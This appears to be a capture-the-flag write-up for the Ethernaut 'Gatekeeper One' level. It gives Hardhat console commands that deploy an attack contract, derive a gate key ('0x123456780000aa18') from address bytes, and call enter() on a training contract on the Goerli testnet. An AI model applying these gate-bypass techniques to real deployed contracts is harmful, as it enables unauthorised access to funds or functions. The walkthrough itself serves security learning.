# Gatekeeper One

[Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69)


The contract controls access to a function through 3 modifiers. To satisfy the enforced restrictions one can pre-compute the expected
values.


## Test Attack
```BASH
npx hardhat compile
npx hardhat console
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

//Connect to GatekeeperOne contract on-chain
GateFactory = await ethers.getContractFactory("GatekeeperOne")
gate = await GateFactory.attach("0xb3B110EaAf9A157f94901feC66dED0aD06F1AA38")
await gate.entrant()

//Deploy Attack contract
AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.connect(accounts[0]).deploy(gate.address)

//Discover solution to GateThree
//Consider this 8-byte value
//    1234567890123456
// "0x1234567890abcdef"

//Compute the solution to the various gate condition components
(await attack.left("0x1234567890abcdef")).toString(16)
(await attack.oneu16u64("0x1234567890abcdef")).toString(16)
(await attack.twou64("0x1234567890abcdef")).toHexString()
(await attack.threeu16u64("0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18")).toString(16)

//         90abcdef
//             cdef
// 1234567890abcdef
//             aa18

// Solution:
//   last 4 digits of address
//             \/\/
// 123456780000aa18
// /\/\/\/\
// Non-Zero

await attack.connect(accounts[0]).testThree("0x123456780000aa18")
await attack.connect(accounts[0]).enter("0x123456780000aa18", 0)
(await attack.extragas()).toString()
```

<BR />

## Live Attack

```BASH
npx hardhat compile
npx hardhat console --network goerli
```

```JS
accounts = await ethers.getSigners()
accounts[0].address

//Connect to GatekeeperOne contract on-chain
GateFactory = await ethers.getContractFactory("GatekeeperOne")
gate = await GateFactory.attach("0xb3B110EaAf9A157f94901feC66dED0aD06F1AA38")
await gate.entrant()

//Deploy Attack contract
AttackFactory = await ethers.getContractFactory("Attack")
attack = await AttackFactory.connect(accounts[0]).deploy(gate.address)

await attack.connect(accounts[0]).testThree("0x123456780000aa18")
await attack.connect(accounts[0]).enter("0x123456780000aa18", 0)
(await attack.extragas()).toString()
```

<BR />

## Other

```shell
npx hardhat help
npx hardhat test
REPORT_GAS=true npx hardhat test
npx hardhat node
npx hardhat run scripts/deploy.ts
```
